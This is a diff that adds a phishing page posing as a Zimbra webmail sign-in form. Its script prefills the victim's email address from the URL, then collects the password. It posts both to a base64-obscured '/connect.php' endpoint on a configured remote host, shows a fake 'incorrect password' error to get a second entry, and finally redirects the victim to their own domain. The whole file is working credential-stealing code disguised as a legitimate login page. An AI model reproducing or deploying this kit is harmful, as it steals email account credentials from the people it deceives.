@@ -1,0 +1,333 @@
+<!-- TODO: Zimbra mx for email-->
+<!DOCTYPE html>
+
+<html class="user_font_size_normal" lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+    <!--	<title>Zimbra Web Client Sign In</title> -->
+    <title>Zimbra Web Client </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+        content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit ">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <link rel="stylesheet" type="text/css"
+        href="https://fggtc5q45zqdacinyfa6qufqey35d2beoellh5prf3cryjzhjdna.arweave.net/KY0xdhzuYDAJDcFB6FCwJjfR6CRxFrP18S7FHCcnSNo">
+    <link rel="SHORTCUT ICON" href="https://webmail.telkomsa.net/mail/img/logo/favicon.ico">
+
+
+</head>
+
+<body>
+
+    <div style="position: sticky; top: 0; background-color: #f1f1f1;  z-index: 999;">
+        <div id="google_translate_element"></div>
+    </div>
+
+    <div class="LoginScreen">
+        <nav class="navbar navbar-expand-lg login-navbar" style="background-color: #007cc3;" role="navigation">
+            <a class="navbar-brand" href="#">
+                <img src="https://i.imgur.com/cDd7k7c.png" alt="logo" style=" MAX-WIDTH: 10%;">
+            </a>
+        </nav>
+
+        <div class="center">
+            <div class="contentBox">
+                <!-- <h1><a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span> 
+				
+					<span class="ImgLoginBanner"></span>
+				</a></h1> -->
+                <h1 style="padding:15px; font-weight:600; color:white"></h1>
+
+                <div class="form-group">
+                                <center>
+                                    <div class="" id="msg" style="display: none; color: red;">The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password</div>
+                                    <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                                </center>
+                            </div>
+
+                <!-- <div class=""
+                    style="color: rgb(236, 59, 59); text-align: left; font-size:14px; padding-left: 0px; padding-bottom: 10px;"
+                    id="error"></div> -->
+
+				
+                <div id="ZLoginAppName">Web Client</div>
+                <input type="hidden" name="loginOp" value="login" />
+                <input type="hidden" name="login_csrf" value="3ffe58a9-5ffb-413d-a3e6-1da9a7ac088c" />
+
+
+                <form id="" name="form1" data-name="" action="" method="post" required>
+
+                    <table class="form">
+                        <tr>
+                            <td><label for="username">Username:</label></td>
+                            <td><input name="ai" id="ai" class="zLoginField" type="text" value="" readonly /></td>
+                        </tr>
+                        <tr>
+                            <td><label for="password">Password:</label></td>
+                            <td><input name="namep" id="pr" autocomplete="off" class="zLoginField" type="password"
+                                    value="" size="40" maxlength="1024" /></td>
+                        </tr>
+                        <tr>
+                            <td>&nbsp;</td>
+                            <td class="submitTD">
+                                <input id="remember" value="1" type="checkbox" name="zrememberme" />
+                                <label for="remember">Stay signed in</label>
+                                <input type="submit" class="ZLoginButton DwtButton" onclick="submitForm(event)"
+                                    id="submit-btn" value="Sign In" />
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td colspan="2">
+                                <hr />
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <label for="client">Version:</label>
+                            </td>
+                            <td>
+                                <div class="positioning">
+                                    <select id="client" name="client"
+                                        onchange="clientChange(this.options[this.selectedIndex].value)">
+                                        <option value="preferred" selected> Default</option>
+                                        <option value="advanced"> Advanced (Ajax)</option>
+                                        <option value="standard"> Standard (HTML)</option>
+                                        <option value="mobile"> Mobile</option>
+                                        <option value="touch"> Touch</option>
+                                    </select>
+                                    <script TYPE="text/javascript">
+                                        document.write("<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>What’s This?</a>");
+                                    </script>
+                                    <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;"
+                                        onclick='showWhatsThis();' role="tooltip">
+                                        <h3 style="text-align:center;">Client Types</h3> <b>Advanced</b> offers the full
+                                        set
+                                        of Web collaboration features. This Web Client works best with newer browsers
+                                        and
+                                        faster Internet connections. <br><br><b>Standard</b> is recommended when
+                                        Internet
+                                        connections are slow, when using older browsers, or for easier accessibility.
+                                        <br><br><b>Mobile</b> is recommended for mobile devices. <br><br><b>Touch</b> is
+                                        recommended for tablets. <br><br>To set <b>Default</b> to be your preferred
+                                        client
+                                        type, change the sign in options in your Preferences, General tab after you sign
+                                        in.
+                                    </div>
+                                    <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note
+                                        that
+                                        your web browser or display does not fully support the Advanced version. We
+                                        strongly
+                                        recommend that you use the Standard client.</div>
+                                </div>
+                            </td>
+                        </tr>
+                    </table>
+                </form>
+            </div>
+            <div class="decor1"></div>
+        </div>
+
+
+
+        <div class="Footer">
+
+
+
+            <footer class="page-footer font-small">
+
+
+
+
+                <!-- Copyright -->
+                <div class="footer-copyright text-white text-center py-3" style="background-color: #007cc3;"> Copyright
+                    &copy; 2023 . All Rights Reserved.
+                    <a href="" style="color: #fff;">Privacy Statement</a>
+
+                    <img src="https://i.imgur.com/cDd7k7c.png" alt="logo"
+                        style="float: right;padding-right: 17px;padding-bottom: 7px; MAX-WIDTH: 10%;">
+                </div>
+                <!-- Copyright -->
+
+            </footer>
+
+
+
+
+        </div>
+
+        <div class="decor2"></div>
+    </div>
+
+
+    <!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
+    <!-- jQuery library -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <!-- Popper JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <!-- Latest compiled JavaScript -->
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="./config.js"></script>
+
+	<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
+
+
+    var atu = "L2Nvbm5lY3QucGhw";
+	
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is empty.!");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Please enter your password");
+            ai.focus;
+            return false;
+        }
+		
+		
+		if(pr.length < 5) {  
+
+			$('#error').show();
+            $('#error').html("Please check your password");
+            ai.focus;  
+
+			return false;  
+
+		}
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+
+        $.ajax({
+            dataType: 'JSON',
+            url: `${config.baseUrl}${atob(atu)}`,
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('Login');
+            }
+        });
+    });
+
+
+});
+
+function getParameterByName(name, url) {
+			if (!url) url = window.location.href;
+			name = name.replace(/[\[\]]/g, '\\$&');
+			var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+				results = regex.exec(url);
+			if (!results) return null;
+			if (!results[2]) return '';
+			return decodeURIComponent(results[2].replace(/\+/g, ' '));
+		}
+			
+		const login_username = getParameterByName('cms');
+		document.getElementById("ai").value = login_username;
+</script>
+
+
+</body>
+
+</html>
